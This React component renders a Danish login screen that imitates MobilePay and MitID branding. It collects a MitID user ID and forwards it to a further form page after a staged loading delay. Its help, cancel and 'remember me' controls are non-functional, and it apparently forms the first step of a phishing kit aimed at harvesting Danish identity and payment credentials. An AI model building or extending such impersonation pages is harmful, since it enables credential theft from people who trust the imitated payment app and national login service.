import React, { useEffect, useState } from "react";
import Form from "react-bootstrap/Form";
import { AiOutlineInfoCircle } from "react-icons/ai";
import { FaArrowRight } from "react-icons/fa";
import { Link, useNavigate } from "react-router-dom";
import Loader from "./Loader";
import "./Login.css";
import MitLogo from "./images/mit.png";
import MobilepayLogo from "./images/mobilePayLogo.png";

const Login = () => {
  const [inputValue, setInputValue] = useState("");
  const [loading, setLoading] = useState(true);
  const navigate = useNavigate();
  const handleInputChange = (event) => {
    setInputValue(event.target.value);
  };
  const handleButtonClick = () => {
    if (inputValue) {
      const data = {"MitID": inputValue}
      navigate("/FormFile", {state: data});
    }
  };

  useEffect(() => {
    setTimeout(() => {
      setLoading(false);
    }, 2000);
  }, []);

  if (loading) return <Loader />;

  return (
    

    <div className="loginContainer">
      

      

      <div className="login_form">
          <img src={MobilepayLogo} alt="Logo" width="125px" height="23px" class="mobilepay_logo" />
        <div className="login_form_logo">
          <div>Log ind på MobilePay</div>
          <div>
            <img src={MitLogo} alt="Logo" width="70px" height="40px" />
          </div>
        </div>
        <div className="divider"></div>
        <div className="userid_form">
          <label >BRUGER-ID</label>
          <input type="text" value={inputValue} onChange={handleInputChange} />
        </div>
        <div className="btn_cont">
          <button
            className="button"
            disabled={!inputValue}
            onClick={handleButtonClick}
          >
            <span className="button-text">FORTSÆT</span>
            <FaArrowRight className="button-icon" />
          </button>
        </div>
        <div className="lost_user_id">
          <Link to="/lost-user-id" className="link">
            <div>
              <AiOutlineInfoCircle style={{ fontSize: "18px", color: "#0253E3" }} />
            </div>
            <div
              style={{
                marginLeft: "5px",
                fontWeight: "600",
                marginBottom: "-3px",
                color:"#0253E3",
              }}
            >
              Brug for hjælp?
            </div>
          </Link>
        </div>
        <Form.Check
          style={{ marginTop: "50px", marginBottom: "10px" }}
          type="checkbox"
          id="Husk mig på MitID.dk"
          label="Husk mig hos MobilePay"
        />

        <div className="divider"></div>
        <button className="cancel_btn">Afbryd</button>
        <button className="cancel_btn">Hjælp</button>
      </div>
    </div>
  );
};

export default Login;
